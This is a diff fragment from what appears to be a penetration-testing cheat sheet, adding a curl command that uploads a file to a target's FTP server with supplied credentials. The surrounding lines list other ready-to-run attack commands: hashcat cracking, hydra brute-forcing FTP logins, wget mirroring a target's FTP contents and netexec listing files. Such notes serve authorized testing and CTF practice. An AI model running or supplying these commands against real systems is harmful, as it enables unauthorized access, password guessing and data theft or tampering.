@@ -364,6 +364,7 @@ hashcat -m 13721 FILENAME.hc mutated.list
 
 [*] (21) FTP
 wget ftp://$TARGET --ftp-user='$USERNAME' --ftp-password='$PASSWORD' -m -q --no-parent --cut-dirs=1 --no-directories -P ftp
+curl ftp://$TARGET -u '$USERNAME':'$PASSWORD' -T filename.txt
 
 hydra -L usernames -P passwords ftp://$TARGET -t35
 nxc ftp "$TARGET" -u '$USERNAME' -p '$PASSWORD' --ls
